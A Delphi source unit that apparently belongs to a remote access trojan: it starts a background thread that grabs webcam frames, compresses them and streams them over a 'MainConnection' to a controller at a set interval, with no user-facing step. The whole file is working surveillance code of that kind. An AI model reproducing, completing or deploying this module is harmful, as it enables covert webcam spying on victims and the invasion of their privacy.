unit UnitWebcamCapture;

interface

uses
  Windows, Classes, Graphics, StreamUnit, UnitVariables, UnitConstants,
  uCamHelper, WebcamAPI, UnitCaptureFunctions, UnitFunctions, UnitConnection;

type
  TWebcamThread = class(TThread)
  private
    procedure SendWebcam;
    procedure SendWebcam2;
  protected
    procedure Execute; override;
  public
    constructor Create;
  end;

var
  WebcamThread: TWebcamThread;
  SendWebcamImg: Boolean;

implementation

constructor TWebcamThread.Create;
begin
  inherited Create(True);
  SendWebcamImg := True;
end;

procedure TWebcamThread.Execute;
begin
  if WebcamType = 0 then SendWebcam else SendWebcam2;
end;

procedure TWebcamThread.SendWebcam;
var
  TmpStr: WideString;
  Bmp: TBitmap;
begin
  Sleep(1000);

  while CamHelper.Started do
  begin
    try
      if SendWebcamImg = False then Break else
      begin
        TmpStr := '';
        Bmp := TBitmap.Create;
        CamHelper.GetImage(Bmp);
        TmpStr := GetImageFromBMP(Bmp, WebcamQuality);
        Bmp.Free;
        if TmpStr <> '' then
        try SendDatas(MainConnection, WEBCAM + '|' + WEBCAMIMAGE + '|' + TmpStr) except Break; end;

        ProcessMessages;
        Sleep(10);
        if WebcamInterval > 0 then Sleep(WebcamInterval * 1000);
      end;
    except
      Break;
    end;
  end;

  CamHelper.StopCam;
  SendDatas(MainConnection, WEBCAM + '|' + WEBCAMDISCONNECT + '|');
end;

procedure TWebcamThread.SendWebcam2;
type
  TNewMemoryStream = Classes.TMemoryStream;
var
  TmpStr: WideString;
  Bmp: TBitmap;
  Stream: TNewMemoryStream;
  Msg: TMsg;
begin
  if InitCapture(WebcamId) = True then
  begin
    Stream := TNewMemoryStream.Create;
    while SendWebcamImg = True do
    begin
      if GetWebcamImage(Stream) = True then
      begin
        Stream.Position := 0;
        Bmp := TBitmap.Create;
        Bmp.LoadFromStream(Stream);
        TmpStr := GetImageFromBMP(Bmp, WebcamQuality);
        Bmp.Free;
        if TmpStr <> '' then
        SendDatas(MainConnection, WEBCAM + '|' + WEBCAMIMAGE + '|' + TmpStr);
        
        ProcessMessages;
        Sleep(10);
        if WebcamInterval > 0 then Sleep(WebcamInterval * 1000);
      end;
    end;
    Stream.Free;
    DestroyCapture;

    while Assigned(MyWebcamObject) and (GetMessage(Msg, MyWebcamObject.Handle, 0, 0)) do
    begin
      TranslateMessage(Msg);
      DispatchMessage(Msg);
    end;
  end;
  
  SendDatas(MainConnection, WEBCAM + '|' + WEBCAMDISCONNECT + '|');
end;

end.
